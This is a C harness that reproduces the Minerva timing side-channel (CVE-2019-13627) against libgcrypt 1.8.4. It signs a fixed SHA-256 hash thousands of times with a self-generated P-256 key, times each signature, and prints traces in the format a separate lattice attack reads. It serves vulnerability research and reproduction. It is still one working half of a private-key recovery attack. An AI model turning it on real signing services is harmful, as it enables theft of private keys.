/* ECDSA timing harness over REAL libgcrypt (Minerva, CVE-2019-13627).
 *
 * Signs a fixed message's SHA-256 with random per-signature nonces and times each
 * gcry_pk_sign. On libgcrypt 1.8.4 the scalar multiplication's time depends on the
 * nonce bit-length (the leak); 1.8.5 makes it constant time. Emits the trace format
 * the vendored Minerva lattice attack reads: line 1 "<pubkey> <message>", then
 * "r_hex,s_hex,time" rows. The message is re-hashed with SHA-256 by the attack.
 */
#include <gcrypt.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#ifndef NSIGS
#define NSIGS 4000
#endif
static uint64_t rd(void){ unsigned a; return __rdtscp(&a); }

int main(void){
  gcry_check_version(NULL);
  gcry_control(GCRYCTL_DISABLE_SECMEM, 0);
  gcry_control(GCRYCTL_INITIALIZATION_FINISHED, 0);

  gcry_sexp_t params, key, pub, sec;
  gcry_sexp_build(&params, NULL, "(genkey (ecc (curve \"NIST P-256\")))");
  if (gcry_pk_genkey(&key, params)) { fprintf(stderr, "genkey failed\n"); return 2; }
  pub = gcry_sexp_find_token(key, "public-key", 0);
  sec = gcry_sexp_find_token(key, "private-key", 0);

  gcry_sexp_t qs = gcry_sexp_find_token(pub, "q", 0);
  gcry_mpi_t q = gcry_sexp_nth_mpi(qs, 1, GCRYMPI_FMT_USG);
  unsigned char qbuf[133]; size_t qlen;
  gcry_mpi_print(GCRYMPI_FMT_USG, qbuf, sizeof qbuf, &qlen, q);

  unsigned char msg[32]; memset(msg, 0x5a, 32);
  unsigned char h[32];
  gcry_md_hash_buffer(GCRY_MD_SHA256, h, msg, 32);
  gcry_mpi_t hm; gcry_mpi_scan(&hm, GCRYMPI_FMT_USG, h, 32, NULL);
  gcry_sexp_t data;
  gcry_sexp_build(&data, NULL, "(data (flags raw) (value %M))", hm);

  for (size_t i = 0; i < qlen; i++) printf("%02x", qbuf[i]);
  printf(" ");
  for (int i = 0; i < 32; i++) printf("%02x", msg[i]);
  printf("\n");

  for (int i = 0; i < NSIGS; i++) {
    gcry_sexp_t sig;
    uint64_t t0 = rd();
    if (gcry_pk_sign(&sig, data, sec)) { fprintf(stderr, "sign failed\n"); return 3; }
    uint64_t t1 = rd();
    gcry_sexp_t rs = gcry_sexp_find_token(sig, "r", 0);
    gcry_sexp_t ss = gcry_sexp_find_token(sig, "s", 0);
    gcry_mpi_t r = gcry_sexp_nth_mpi(rs, 1, GCRYMPI_FMT_USG);
    gcry_mpi_t s = gcry_sexp_nth_mpi(ss, 1, GCRYMPI_FMT_USG);
    unsigned char *rh = NULL, *sh = NULL;
    gcry_mpi_aprint(GCRYMPI_FMT_HEX, &rh, NULL, r);
    gcry_mpi_aprint(GCRYMPI_FMT_HEX, &sh, NULL, s);
    printf("%s,%s,%llu\n", rh, sh, (unsigned long long)(t1 - t0));
    gcry_free(rh); gcry_free(sh);
    gcry_mpi_release(r); gcry_mpi_release(s);
    gcry_sexp_release(rs); gcry_sexp_release(ss); gcry_sexp_release(sig);
  }
  return 0;
}
